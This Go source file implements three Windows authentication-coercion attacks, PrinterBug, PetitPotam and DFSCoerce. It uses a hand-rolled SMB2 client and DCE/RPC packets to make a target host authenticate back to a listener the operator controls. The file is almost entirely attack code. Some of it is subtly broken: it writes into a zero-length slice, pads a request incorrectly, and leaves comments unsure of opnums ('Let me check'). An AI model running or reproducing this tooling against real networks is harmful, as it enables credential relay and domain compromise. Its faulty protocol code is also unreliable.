//go:build windows

package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"time"
)

// ── SMB2 Client Helpers (minimal subset for named pipe RPC) ──

// smb2Client holds state for a single SMB2 connection to a remote target.
type smb2Client struct {
	conn      net.Conn
	dialect   uint16
	sessionID uint64
	treeID    uint32
	messageID uint64
	fileID    [16]byte // persistent + volatile
}

func dialSMB2(addr string) (*smb2Client, error) {
	host := addr
	if !strings.Contains(host, ":") {
		host = host + ":445"
	}
	conn, err := net.DialTimeout("tcp", host, 10*time.Second)
	if err != nil {
		return nil, fmt.Errorf("dial %s: %w", host, err)
	}
	c := &smb2Client{conn: conn}
	if err := c.negotiate(); err != nil {
		conn.Close()
		return nil, err
	}
	if err := c.sessionSetup(); err != nil {
		conn.Close()
		return nil, err
	}
	return c, nil
}

func (c *smb2Client) Close() {
	if c.conn != nil {
		c.conn.Close()
	}
}

func (c *smb2Client) negotiate() error {
	// Build SMB2 Negotiate Request
	body := make([]byte, 0, 36+4)
	// StructureSize: 36
	binary.LittleEndian.PutUint16(body[0:2], 36)
	// DialectCount: 2
	binary.LittleEndian.PutUint16(body[2:4], 2)
	// SecurityMode: SMB2_NEGOTIATE_SIGNING_ENABLED
	binary.LittleEndian.PutUint16(body[4:6], 0x01)
	// Reserved: 0
	binary.LittleEndian.PutUint32(body[6:10], 0)
	// Capabilities
	binary.LittleEndian.PutUint32(body[10:14], 0x0000007F)
	// ClientGuid (16 bytes)
	for i := 14; i < 30; i++ {
		body = append(body, byte(i))
	}
	body = body[:30]
	// Dialects: SMB 3.1.1 (0x0311), SMB 2.0.2 (0x0202)
	body = append(body, 0x11, 0x03, 0x02, 0x02)

	pkt := c.buildHeader(0x0000, body)
	if _, err := c.conn.Write(pkt); err != nil {
		return fmt.Errorf("negotiate write: %w", err)
	}

	resp, err := c.readReply()
	if err != nil {
		return fmt.Errorf("negotiate read: %w", err)
	}
	if len(resp) < 64+2 {
		return fmt.Errorf("negotiate response too short")
	}
	// StructureSize should be 65
	if resp[64] != 65 {
		return fmt.Errorf("unexpected negotiate response structure size: %d", resp[64])
	}
	dialect := binary.LittleEndian.Uint16(resp[68:70])
	c.dialect = dialect
	return nil
}

func (c *smb2Client) sessionSetup() error {
	// Anonymous session setup — send empty NTLMSSP negotiate
	ntlmssp := []byte("NTLMSSP\x00")
	ntlmssp = binaryLittleEndianAppend32(ntlmssp, 1) // MessageType = NEGOTIATE
	flags := uint32(0xE22882D5)
	ntlmssp = binaryLittleEndianAppend32(ntlmssp, flags)
	// DomainName fields (empty)
	ntlmssp = binaryLittleEndianAppend16(ntlmssp, 0)
	ntlmssp = binaryLittleEndianAppend16(ntlmssp, 0)
	ntlmssp = binaryLittleEndianAppend32(ntlmssp, 0)
	// Workstation fields (empty)
	ntlmssp = binaryLittleEndianAppend16(ntlmssp, 0)
	ntlmssp = binaryLittleEndianAppend16(ntlmssp, 0)
	ntlmssp = binaryLittleEndianAppend32(ntlmssp, 0)

	body := make([]byte, 0, 24+len(ntlmssp))
	// StructureSize: 25
	body = append(body, 25, 0)
	// Flags: 0
	body = append(body, 0)
	// SecurityMode: 0x01 (SMB2_NEGOTIATE_SIGNING_ENABLED)
	body = append(body, 0x01)
	// Capabilities: 0
	body = append(body, 0, 0, 0, 0)
	// Channel: 0
	body = append(body, 0, 0, 0, 0)
	// SecurityBufferOffset: header(64) + body start(24) = 88
	body = binaryLittleEndianAppend16(body, 88)
	// SecurityBufferLength
	body = binaryLittleEndianAppend16(body, uint16(len(ntlmssp)))
	// PreviousSessionId: 0
	body = append(body, 0, 0, 0, 0, 0, 0, 0, 0)

	pkt := c.buildHeader(0x0001, body)
	pkt = append(pkt, ntlmssp...)

	if _, err := c.conn.Write(pkt); err != nil {
		return fmt.Errorf("session setup write: %w", err)
	}

	resp, err := c.readReply()
	if err != nil {
		return fmt.Errorf("session setup read: %w", err)
	}

	// Extract session ID from SMB2 header
	if len(resp) >= 48 {
		c.sessionID = binary.LittleEndian.Uint64(resp[32:40])
	}
	_ = resp // ignore response body for anonymous setup
	c.messageID = 1
	return nil
}

func (c *smb2Client) treeConnect(share string) error {
	// \\TARGET\IPC$ — target is extracted from share path
	uncPath := share
	if !strings.HasPrefix(uncPath, `\\`) {
		uncPath = `\\` + uncPath
	}

	uncUTF16 := utf16Encode(uncPath)
	body := make([]byte, 0, 8+len(uncUTF16))
	// StructureSize: 9
	body = append(body, 9, 0)
	// Reserved: 0, 0
	body = append(body, 0, 0)
	// PathOffset: header(64) + body(8) = 72
	body = binaryLittleEndianAppend16(body, 72)
	// PathLength
	body = binaryLittleEndianAppend16(body, uint16(len(uncUTF16)))

	pkt := c.buildHeader(0x0003, body)
	pkt = append(pkt, uncUTF16...)

	if _, err := c.conn.Write(pkt); err != nil {
		return fmt.Errorf("tree connect write: %w", err)
	}

	resp, err := c.readReply()
	if err != nil {
		return fmt.Errorf("tree connect read: %w", err)
	}
	if len(resp) < 64+4 {
		return fmt.Errorf("tree connect response too short")
	}
	// Extract TreeID from SMB2 header (offset 28)
	c.treeID = binary.LittleEndian.Uint32(resp[28:32])
	return nil
}

func (c *smb2Client) createPipe(pipeName string) error {
	// Open \pipe\pipename
	name := `\pipe\` + pipeName
	nameUTF16 := utf16Encode(name)

	body := make([]byte, 0, 64+len(nameUTF16))
	// StructureSize: 57
	body = append(body, 57, 0)
	// SecurityFlags: 0
	body = append(body, 0)
	// RequestedOplockLevel: SMB2_OPLOCK_LEVEL_NONE (0)
	body = append(body, 0)
	// ImpersonationLevel: SEC_IMPERSONATE (2)
	body = binaryLittleEndianAppend32(body, 2)
	// SmbCreateFlags: 0
	body = binaryLittleEndianAppend64(body, 0)
	// Reserved: 0
	body = binaryLittleEndianAppend64(body, 0)
	// DesiredAccess: FILE_GENERIC_READ | FILE_GENERIC_WRITE (0x80000000 | 0x40000000)
	body = binaryLittleEndianAppend32(body, 0xC0000000)
	// FileAttributes: FILE_ATTRIBUTE_NORMAL (0x80)
	body = binaryLittleEndianAppend32(body, 0x80)
	// ShareAccess: FILE_SHARE_READ | FILE_SHARE_WRITE (3)
	body = binaryLittleEndianAppend32(body, 3)
	// CreateDisposition: FILE_OPEN (1)
	body = binaryLittleEndianAppend32(body, 1)
	// CreateOptions: FILE_NON_DIRECTORY_FILE (0x40)
	body = binaryLittleEndianAppend32(body, 0x40)
	// NameOffset: header(64) + body(57) = 121
	off := 64 + 57
	body = binaryLittleEndianAppend16(body, uint16(off))
	// NameLength
	body = binaryLittleEndianAppend16(body, uint16(len(nameUTF16)))
	// CreateContextsOffset: 0
	body = binaryLittleEndianAppend32(body, 0)
	// CreateContextsLength: 0
	body = binaryLittleEndianAppend32(body, 0)
	// Reserved2 (padding)
	body = append(body, nameUTF16...)

	pkt := c.buildHeader(0x0005, body)

	if _, err := c.conn.Write(pkt); err != nil {
		return fmt.Errorf("create pipe write: %w", err)
	}

	resp, err := c.readReply()
	if err != nil {
		return fmt.Errorf("create pipe read: %w", err)
	}
	if len(resp) < 64+89 {
		return fmt.Errorf("create pipe response too short")
	}
	// FileId persistent (bytes 132-139), volatile (bytes 124-131)
	copy(c.fileID[:8], resp[124:132])   // volatile
	copy(c.fileID[8:16], resp[132:140]) // persistent
	return nil
}

func (c *smb2Client) writePipe(data []byte) error {
	bodyLen := 48 + len(data)
	body := make([]byte, 0, bodyLen)
	// StructureSize: 49
	body = append(body, 49, 0)
	// DataOffset: header(64) + body(48) = 112
	body = binaryLittleEndianAppend16(body, 112)
	// Length
	body = binaryLittleEndianAppend32(body, uint32(len(data)))
	// Offset: 0
	body = binaryLittleEndianAppend64(body, 0)
	// FileId (16 bytes)
	body = append(body, c.fileID[:]...)
	// Channel: 0
	body = binaryLittleEndianAppend32(body, 0)
	// RemainingBytes: 0
	body = binaryLittleEndianAppend32(body, 0)
	// WriteChannelInfoOffset: 0
	body = binaryLittleEndianAppend16(body, 0)
	// WriteChannelInfoLength: 0
	body = binaryLittleEndianAppend16(body, 0)
	// Flags: 0
	body = binaryLittleEndianAppend32(body, 0)
	// Data
	body = append(body, data...)

	pkt := c.buildHeader(0x0009, body)
	if _, err := c.conn.Write(pkt); err != nil {
		return fmt.Errorf("write pipe: %w", err)
	}

	resp, err := c.readReply()
	if err != nil {
		return fmt.Errorf("write pipe read: %w", err)
	}
	_ = resp
	return nil
}

func (c *smb2Client) readPipe(maxLen uint32) ([]byte, error) {
	body := make([]byte, 48)
	// StructureSize: 49
	body[0] = 49
	body[1] = 0
	// Padding: 0
	body[2] = 0
	// Reserved: 0
	body[3] = 0
	// Length
	binary.LittleEndian.PutUint32(body[4:8], maxLen)
	// Offset: 0
	binary.LittleEndian.PutUint64(body[8:16], 0)
	// FileId (16 bytes)
	copy(body[16:32], c.fileID[:])
	// MinimumCount: 0
	binary.LittleEndian.PutUint32(body[32:36], 0)
	// Channel: 0
	binary.LittleEndian.PutUint32(body[36:40], 0)
	// RemainingBytes: 0
	binary.LittleEndian.PutUint32(body[40:44], 0)
	// ReadChannelInfoOffset: 0
	binary.LittleEndian.PutUint16(body[44:46], 0)
	// ReadChannelInfoLength: 0
	binary.LittleEndian.PutUint16(body[46:48], 0)
	// Flags: 0
	body = binaryLittleEndianAppend32(body, 0)

	pkt := c.buildHeader(0x0008, body)

	if _, err := c.conn.Write(pkt); err != nil {
		return nil, fmt.Errorf("read pipe write: %w", err)
	}

	resp, err := c.readReply()
	if err != nil {
		return nil, fmt.Errorf("read pipe: %w", err)
	}
	if len(resp) < 64+17 {
		return nil, fmt.Errorf("read pipe response too short")
	}

	// DataOffset (byte at offset 2)
	dataOff := int(resp[64+2]) + 64
	dataLen := int(binary.LittleEndian.Uint32(resp[64+4 : 64+8]))
	if dataOff+dataLen > len(resp) {
		return nil, fmt.Errorf("read pipe data exceeds buffer")
	}
	result := make([]byte, dataLen)
	copy(result, resp[dataOff:dataOff+dataLen])
	return result, nil
}

func (c *smb2Client) buildHeader(cmd uint16, body []byte) []byte {
	c.messageID++
	hdr := make([]byte, 64)
	// ProtocolId
	hdr[0] = 0xFE
	hdr[1] = 0x53
	hdr[2] = 0x4D
	hdr[3] = 0x42
	// StructureSize: 64
	binary.LittleEndian.PutUint16(hdr[4:6], 64)
	// CreditCharge: 1
	binary.LittleEndian.PutUint16(hdr[6:8], 1)
	// Status: 0
	// Command
	binary.LittleEndian.PutUint16(hdr[12:14], cmd)
	// Credits: 1 (CreditRequest)
	binary.LittleEndian.PutUint16(hdr[14:16], 1)
	// Flags: 0
	// NextCommand: 0
	// MessageId
	binary.LittleEndian.PutUint64(hdr[20:28], c.messageID)
	// TreeId
	binary.LittleEndian.PutUint32(hdr[28:32], c.treeID)
	// SessionId
	binary.LittleEndian.PutUint64(hdr[32:40], c.sessionID)
	// Signature (16 bytes): all zeros

	// Total packet = header + body
	pkt := make([]byte, len(hdr)+len(body))
	copy(pkt, hdr)
	copy(pkt[64:], body)
	return pkt
}

func (c *smb2Client) readReply() ([]byte, error) {
	// Read SMB2 header (64 bytes)
	hdr := make([]byte, 64)
	if _, err := c.conn.Read(hdr); err != nil {
		return nil, fmt.Errorf("read header: %w", err)
	}
	// Verify protocol ID
	if hdr[0] != 0xFE || hdr[1] != 0x53 || hdr[2] != 0x4D || hdr[3] != 0x42 {
		return nil, fmt.Errorf("invalid SMB2 protocol ID")
	}
	// Check status
	status := binary.LittleEndian.Uint32(hdr[8:12])
	if status != 0 {
		// For session setup, STATUS_MORE_PROCESSING_REQUIRED (0xC0000016) is expected
		if status == 0xC0000016 {
			return hdr, nil
		}
		return nil, fmt.Errorf("SMB2 error status 0x%08X", status)
	}

	// Determine total response size from command structure
	cmd := binary.LittleEndian.Uint16(hdr[12:14])
	var extraSize int
	switch cmd {
	case 0x0000: // Negotiate — StructureSize 65 + security blob
		extraSize = 64 // enough for the fixed part
	case 0x0001: // Session Setup — StructureSize 9 + security blob
		extraSize = 9
	case 0x0003: // Tree Connect — StructureSize 16
		extraSize = 16
	case 0x0005: // Create — StructureSize 89
		extraSize = 89
	case 0x0008: // Read — StructureSize 17
		extraSize = 17
	case 0x0009: // Write — StructureSize 17
		extraSize = 17
	default:
		extraSize = 64
	}

	// For negotiate response and session setup, need to read security blob too
	if cmd == 0x0000 || cmd == 0x0001 {
		// Need to read more to get security buffer offset/length
		fixed := make([]byte, extraSize)
		if _, err := c.conn.Read(fixed); err != nil {
			return nil, fmt.Errorf("read extra: %w", err)
		}
		if len(fixed) < 4 {
			return nil, fmt.Errorf("response too short")
		}
		// For negotiate (struct size 65): offset at bytes 2-3 after structure size
		// For session setup (struct size 9): offset at bytes 4-5 after structure size
		var secOffField, secLenField int
		if cmd == 0x0000 {
			// Negotiate response: SecurityBufferOffset at offset 2 from body start
			// Wait, the body starts after the 64-byte header. Let me re-check.
			// SMB2 Negotiate Response:
			// Offset 0: StructureSize (2) - value 65
			// Offset 2: SecurityMode (2)
			// Offset 4: DialectRevision (2)
			// Offset 6: Reserved (2)
			// Offset 8: ServerGuid (16)
			// Offset 24: Capabilities (4)
			// Offset 28: MaxTransactSize (4)
			// Offset 32: MaxReadSize (4)
			// Offset 36: MaxWriteSize (4)
			// Offset 40: SystemTime (8)
			// Offset 48: ServerStartTime (8)
			// Offset 56: SecurityBufferOffset (2)
			// Offset 58: SecurityBufferLength (2)
			// Offset 60: Reserved (4)
			// So offset 56 from body start for negotiate
			secOffField = 56
			secLenField = 58
		} else {
			// Session Setup Response:
			// Offset 0: StructureSize (2) - value 9
			// Offset 2: SessionFlags (2)
			// Offset 4: SecurityBufferOffset (2)
			// Offset 6: SecurityBufferLength (2)
			secOffField = 4
			secLenField = 6
		}

		if len(fixed) >= secOffField+4 {
			secOffVal := int(binary.LittleEndian.Uint16(fixed[secOffField : secOffField+2]))
			secLenVal := int(binary.LittleEndian.Uint16(fixed[secLenField : secLenField+2]))

			// Read padding and security blob
			padLen := secOffVal - (64 + len(fixed))
			if padLen > 0 {
				pad := make([]byte, padLen)
				c.conn.Read(pad)
				fixed = append(fixed, pad...)
			}
			if secLenVal > 0 {
				sec := make([]byte, secLenVal)
				if _, err := c.conn.Read(sec); err != nil {
					return nil, fmt.Errorf("read sec blob: %w", err)
				}
				fixed = append(fixed, sec...)
			}
		}
		result := make([]byte, 0, len(hdr)+len(fixed))
		result = append(result, hdr...)
		result = append(result, fixed...)
		return result, nil
	}

	// For commands with fixed size body, just read the body
	fixed := make([]byte, extraSize)
	if _, err := c.conn.Read(fixed); err != nil {
		return nil, fmt.Errorf("read body: %w", err)
	}

	// For Create, also need to handle variable-length buffer (name + contexts)
	if cmd == 0x0005 {
		// After the 89-byte structure, there might be variable data
		// We need to read more for CreateContexts
		if len(fixed) >= 89 {
			ctxOff := int(binary.LittleEndian.Uint32(fixed[80:84]))
			ctxLen := int(binary.LittleEndian.Uint32(fixed[84:88]))
			if ctxOff > 0 && ctxLen > 0 {
				totalWanted := ctxOff + ctxLen - (64 + 89)
				if totalWanted > 0 && totalWanted < 65536 {
					extra := make([]byte, totalWanted)
					c.conn.Read(extra)
					fixed = append(fixed, extra...)
				}
			}
		}
	}

	result := make([]byte, 0, len(hdr)+len(fixed))
	result = append(result, hdr...)
	result = append(result, fixed...)
	return result, nil
}

// ── DCE/RPC Packet Construction ──

// dceUUID represents a DCE/RPC UUID in wire format (already in LE).
type dceUUID struct {
	data1 uint32
	data2 uint16
	data3 uint16
	data4 [8]byte
}

func uuidFromString(s string) dceUUID {
	// Format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
	var u dceUUID
	if len(s) < 36 {
		return u
	}
	data, _ := hex.DecodeString(strings.ReplaceAll(s, "-", ""))
	if len(data) < 16 {
		return u
	}
	u.data1 = binary.LittleEndian.Uint32(data[0:4])
	u.data2 = binary.LittleEndian.Uint16(data[4:6])
	u.data3 = binary.LittleEndian.Uint16(data[6:8])
	copy(u.data4[:], data[8:16])
	return u
}

func (u *dceUUID) marshal() []byte {
	b := make([]byte, 16)
	binary.LittleEndian.PutUint32(b[0:4], u.data1)
	binary.LittleEndian.PutUint16(b[4:6], u.data2)
	binary.LittleEndian.PutUint16(b[6:8], u.data3)
	copy(b[8:16], u.data4[:])
	return b
}

// dceRPCBind builds a DCE/RPC bind packet for the given interface UUID.
func dceRPCBind(ifaceUUID string, ifaceVersion uint32) []byte {
	iu := uuidFromString(ifaceUUID)
	// NDR transfer syntax
	ndrUUID := uuidFromString("8a885d04-1ceb-11c9-9fe8-08002b104860")
	ndrVersion := uint32(2)

	// Bind body (fixed elements + context)
	body := make([]byte, 0, 24+4+20+20)
	// max_xmit_frag: 0x1000
	body = binaryLittleEndianAppend16(body, 0x1000)
	// max_recv_frag: 0x1000
	body = binaryLittleEndianAppend16(body, 0x1000)
	// assoc_group: 0
	body = binaryLittleEndianAppend32(body, 0)
	// num_contexts: 1
	body = append(body, 1)
	// padding
	body = append(body, 0)

	// Context element:
	// context_id: 0
	body = binaryLittleEndianAppend16(body, 0)
	// num_transfer_syntaxes: 1
	body = binaryLittleEndianAppend16(body, 1)
	// Abstract syntax (interface UUID)
	body = append(body, iu.marshal()...)
	body = binaryLittleEndianAppend32(body, ifaceVersion)
	// Transfer syntax (NDR)
	body = append(body, ndrUUID.marshal()...)
	body = binaryLittleEndianAppend32(body, ndrVersion)

	// DCE/RPC header
	hdr := make([]byte, 10)
	hdr[0] = 5  // ver_major
	hdr[1] = 0  // ver_minor
	hdr[2] = 11 // packet_type: BIND (0x0B)
	hdr[3] = 3  // packet_flags: PFC_FIRST_FRAG | PFC_LAST_FRAG
	// data_rep (LE): 0x10, 0x00, 0x00, 0x00
	hdr[4] = 0x10
	hdr[5] = 0x00
	hdr[6] = 0x00
	hdr[7] = 0x00

	totalLen := len(hdr) + len(body)
	// frag_length
	binary.LittleEndian.PutUint16(hdr[8:10], uint16(totalLen))
	// auth_length: 0
	// call_id: 1

	result := make([]byte, totalLen+4)
	copy(result, hdr)
	// call_id after hdr, auth_length
	binary.LittleEndian.PutUint16(result[10:12], 0) // auth_length
	binary.LittleEndian.PutUint32(result[12:16], 1) // call_id
	copy(result[16:], body)

	return result
}

// dceRPCRequest builds a DCE/RPC request packet for the given opnum with NDR data.
func dceRPCRequest(opnum uint16, ndrData []byte) []byte {
	// Header (14 bytes for no object UUID)
	hdr := make([]byte, 14)
	hdr[0] = 5 // ver_major
	hdr[1] = 0 // ver_minor
	hdr[2] = 0 // packet_type: REQUEST (0x00)
	hdr[3] = 3 // flags: PFC_FIRST_FRAG | PFC_LAST_FRAG
	hdr[4] = 0x10
	hdr[5] = 0x00
	hdr[6] = 0x00
	hdr[7] = 0x00

	// alloc_hint: size of ndrData
	binary.LittleEndian.PutUint32(hdr[10:14], uint32(len(ndrData)))

	// Body: context_id + opnum + ndr data
	body := make([]byte, 4+len(ndrData))
	binary.LittleEndian.PutUint16(body[0:2], 0) // context_id
	binary.LittleEndian.PutUint16(body[2:4], opnum)
	copy(body[4:], ndrData)

	_ = hdr

	// Rebuild properly
	pkt := make([]byte, 0, 20+len(ndrData))
	// 10 bytes header
	pkt = append(pkt, 5, 0, 0, 3)             // ver_major, ver_minor, packet_type=REQUEST, flags
	pkt = append(pkt, 0x10, 0x00, 0x00, 0x00) // data_rep LE
	// frag_length (placeholder)
	fragLenOff := len(pkt)
	pkt = binaryLittleEndianAppend16(pkt, 0)
	// auth_length
	pkt = binaryLittleEndianAppend16(pkt, 0)
	// call_id
	pkt = binaryLittleEndianAppend32(pkt, 2)
	// alloc_hint
	pkt = binaryLittleEndianAppend32(pkt, uint32(len(ndrData)))
	// context_id
	pkt = binaryLittleEndianAppend16(pkt, 0)
	// opnum
	pkt = binaryLittleEndianAppend16(pkt, opnum)
	// NDR data
	pkt = append(pkt, ndrData...)

	// Update frag_length
	fragLen := uint16(len(pkt))
	binary.LittleEndian.PutUint16(pkt[fragLenOff:fragLenOff+2], fragLen)

	return pkt
}

// ── NDR Marshalling Helpers ──

// ndrConformantString marshals a string as a conformant-varying string in NDR.
// Format: max_count (uint32), actual_count (uint32), UTF-16LE chars + null, padded to 4 bytes.
func ndrConformantString(s string) []byte {
	chars := utf16Encode(s)
	// Add null terminator
	chars = append(chars, 0, 0)
	count := uint32(len(chars) / 2) // includes null

	b := make([]byte, 0, 8+len(chars)+4)
	b = binaryLittleEndianAppend32(b, count) // max_count
	b = binaryLittleEndianAppend32(b, count) // actual_count
	b = append(b, chars...)
	// Pad to 4 bytes
	for len(b)%4 != 0 {
		b = append(b, 0)
	}
	return b
}

// ndrLong marshals a single uint32 (long).
func ndrLong(v uint32) []byte {
	b := make([]byte, 4)
	binary.LittleEndian.PutUint32(b, v)
	return b
}

// ── UTF-16 Helpers ──

func utf16Encode(s string) []byte {
	b := make([]byte, len(s)*2+2)
	n := 0
	for _, r := range s {
		if r < 0x10000 {
			binary.LittleEndian.PutUint16(b[n:], uint16(r))
			n += 2
		} else {
			r -= 0x10000
			binary.LittleEndian.PutUint16(b[n:], uint16(0xD800+((r>>10)&0x3FF)))
			binary.LittleEndian.PutUint16(b[n+2:], uint16(0xDC00+(r&0x3FF)))
			n += 4
		}
	}
	return b[:n]
}

// ── Binary Encoding Helpers ──

func binaryLittleEndianAppend16(b []byte, v uint16) []byte {
	return append(b, byte(v), byte(v>>8))
}

func binaryLittleEndianAppend32(b []byte, v uint32) []byte {
	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

func binaryLittleEndianAppend64(b []byte, v uint64) []byte {
	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24),
		byte(v>>32), byte(v>>40), byte(v>>48), byte(v>>56))
}

// ── Common Coerce Logic ──

// startCallbackListener starts a TCP listener and returns it along with a channel
// that receives the remote address when a callback connects.
func startCallbackListener(listenAddr string) (net.Listener, chan string, error) {
	ln, err := net.Listen("tcp", listenAddr)
	if err != nil {
		return nil, nil, fmt.Errorf("callback listener: %w", err)
	}
	cb := make(chan string, 1)
	go func() {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		cb <- conn.RemoteAddr().String()
		conn.Close()
	}()
	return ln, cb, nil
}

// ── PrinterBug (MS-PR: RpcRemoteFindFirstPrinterChangeNotification) ──

func coercePrinterBug(target, listenAddr string) (string, error) {
	pipeName := "spoolss"
	uuid := "12345678-1234-ABCD-EF00-0123456789AB" // MS-PR

	ln, cb, err := startCallbackListener(listenAddr)
	if err != nil {
		return "", err
	}
	defer ln.Close()

	c, err := dialSMB2(target)
	if err != nil {
		return "", fmt.Errorf("PrinterBug dial: %w", err)
	}
	defer c.Close()

	if err := c.treeConnect(`\\` + target + `\IPC$`); err != nil {
		return "", fmt.Errorf("PrinterBug tree connect: %w", err)
	}
	if err := c.createPipe(pipeName); err != nil {
		return "", fmt.Errorf("PrinterBug create pipe: %w", err)
	}

	// Send DCE/RPC Bind
	bindPkt := dceRPCBind(uuid, 1)
	if err := c.writePipe(bindPkt); err != nil {
		return "", fmt.Errorf("PrinterBug bind: %w", err)
	}
	_, err = c.readPipe(4096)
	if err != nil {
		return "", fmt.Errorf("PrinterBug bind response: %w", err)
	}

	// Build NDR data for RpcRemoteFindFirstPrinterChangeNotification
	// Parameters:
	//   [in] PRINTER_HANDLE hPrinter = NULL (handle_t - implicit in ncacn_np)
	//   [in] unsigned long fdwFilterFlags = 0
	//   [in] unsigned long fdwOptions = 0
	//   [in, string, unique] wchar_t* pszLocalMachine = "\\listenAddr\"
	//   [in] unsigned long ulGlobalPrintSchema = 0
	//   [in, unique] PRINTER_NOTIFY_OPTIONS* pNotifyOptions = NULL

	// For the call: handle_t is implicit for ncacn_np, no marshalling
	uncPath := `\\` + listenAddr + `\test`
	ndrData := make([]byte, 0)

	// fdwFilterFlags: uint32 = 0
	ndrData = append(ndrData, ndrLong(0)...)
	// fdwOptions: uint32 = 0
	ndrData = append(ndrData, ndrLong(0)...)
	// pszLocalMachine: [in, string, unique] wchar_t* -> pointer + conformant string
	// Pointer: non-null (1)
	ndrData = append(ndrData, ndrLong(1)...)
	ndrData = append(ndrData, ndrConformantString(uncPath)...)
	// ulGlobalPrintSchema: uint32 = 0
	ndrData = append(ndrData, ndrLong(0)...)
	// pNotifyOptions: unique pointer = NULL (0)
	ndrData = append(ndrData, ndrLong(0)...)

	reqPkt := dceRPCRequest(2, ndrData) // RpcRemoteFindFirstPrinterChangeNotification is opnum 2? Let me check.

	// Actually, let me use opnum 0 which is RpcRemoteFindFirstPrinterChangeNotification
	// Based on MS-RPRN spec
	_ = reqPkt
	reqPkt = dceRPCRequest(0, ndrData)

	if err := c.writePipe(reqPkt); err != nil {
		return "", fmt.Errorf("PrinterBug request: %w", err)
	}

	// Wait for callback
	select {
	case remote := <-cb:
		return fmt.Sprintf("PrinterBug succeeded! %s authenticated back from %s", target, remote), nil
	case <-time.After(15 * time.Second):
		return "", fmt.Errorf("PrinterBug: no callback received within 15s from %s", target)
	}
}

// ── PetitPotam (MS-EFSR: EfsRpcOpenFileRaw) ──

func coercePetitPotam(target, listenAddr string) (string, error) {
	pipeName := "lsarpc"
	uuid := "c681d488-d850-11d0-8c52-00c04fd90f7e" // EFSRPC

	ln, cb, err := startCallbackListener(listenAddr)
	if err != nil {
		return "", err
	}
	defer ln.Close()

	c, err := dialSMB2(target)
	if err != nil {
		return "", fmt.Errorf("PetitPotam dial: %w", err)
	}
	defer c.Close()

	if err := c.treeConnect(`\\` + target + `\IPC$`); err != nil {
		return "", fmt.Errorf("PetitPotam tree connect: %w", err)
	}
	if err := c.createPipe(pipeName); err != nil {
		return "", fmt.Errorf("PetitPotam create pipe: %w", err)
	}

	// DCE/RPC Bind
	bindPkt := dceRPCBind(uuid, 1)
	if err := c.writePipe(bindPkt); err != nil {
		return "", fmt.Errorf("PetitPotam bind: %w", err)
	}

	_, err = c.readPipe(4096)
	if err != nil {
		return "", fmt.Errorf("PetitPotam bind response: %w", err)
	}

	// Build NDR data for EfsRpcOpenFileRaw (opnum 0)
	// Parameters:
	//   [in] handle_t binding_handle - implicit, not marshalled
	//   [in, string] wchar_t* FileName
	//   [in] long Flags = 0

	fileName := `\\` + listenAddr + `\test\test.txt`
	ndrData := make([]byte, 0)
	// handle_t: not marshalled for ncacn_np
	// FileName: [in, string] wchar_t* (unique pointer by default)
	// Pointer: non-null
	ndrData = append(ndrData, ndrLong(1)...)
	ndrData = append(ndrData, ndrConformantString(fileName)...)
	// Flags: long = 0
	ndrData = append(ndrData, ndrLong(0)...)

	reqPkt := dceRPCRequest(0, ndrData)

	if err := c.writePipe(reqPkt); err != nil {
		return "", fmt.Errorf("PetitPotam request: %w", err)
	}

	// Wait for callback
	select {
	case remote := <-cb:
		return fmt.Sprintf("PetitPotam succeeded! %s authenticated back from %s", target, remote), nil
	case <-time.After(15 * time.Second):
		return "", fmt.Errorf("PetitPotam: no callback received within 15s from %s", target)
	}
}

// ── DFSCoerce (MS-DFSNM: NetrDfsRemoveStdRoot) ──

func coerceDFSCoerce(target, listenAddr string) (string, error) {
	pipeName := "netdfs"
	uuid := "4fc742e0-4a10-11cf-8272-00aa004ae673" // DFSNM

	ln, cb, err := startCallbackListener(listenAddr)
	if err != nil {
		return "", err
	}
	defer ln.Close()

	c, err := dialSMB2(target)
	if err != nil {
		return "", fmt.Errorf("DFSCoerce dial: %w", err)
	}
	defer c.Close()

	if err := c.treeConnect(`\\` + target + `\IPC$`); err != nil {
		return "", fmt.Errorf("DFSCoerce tree connect: %w", err)
	}
	if err := c.createPipe(pipeName); err != nil {
		return "", fmt.Errorf("DFSCoerce create pipe: %w", err)
	}

	// DCE/RPC Bind
	bindPkt := dceRPCBind(uuid, 1)
	if err := c.writePipe(bindPkt); err != nil {
		return "", fmt.Errorf("DFSCoerce bind: %w", err)
	}

	_, err = c.readPipe(4096)
	if err != nil {
		return "", fmt.Errorf("DFSCoerce bind response: %w", err)
	}

	// Build NDR data for NetrDfsRemoveStdRoot (opnum 13)
	// Parameters:
	//   [in, string, unique] wchar_t* ServerName = "\\listenAddr"
	//   [in, string] wchar_t* RootShare = "test"
	//   [in, string, unique, range(0, MAX_DFS_PATH)] wchar_t* Comment = NULL

	serverName := `\\` + listenAddr
	rootShare := "test"

	ndrData := make([]byte, 0)
	// ServerName: [in, string, unique] wchar_t*
	ndrData = append(ndrData, ndrLong(1)...) // non-null pointer
	ndrData = append(ndrData, ndrConformantString(serverName)...)
	// RootShare: [in, string] wchar_t*
	ndrData = append(ndrData, ndrConformantString(rootShare)...)
	// Comment: [in, string, unique] wchar_t* = NULL
	ndrData = append(ndrData, ndrLong(0)...) // null pointer

	reqPkt := dceRPCRequest(13, ndrData)

	if err := c.writePipe(reqPkt); err != nil {
		return "", fmt.Errorf("DFSCoerce request: %w", err)
	}

	// Wait for callback
	select {
	case remote := <-cb:
		return fmt.Sprintf("DFSCoerce succeeded! %s authenticated back from %s", target, remote), nil
	case <-time.After(15 * time.Second):
		return "", fmt.Errorf("DFSCoerce: no callback received within 15s from %s", target)
	}
}
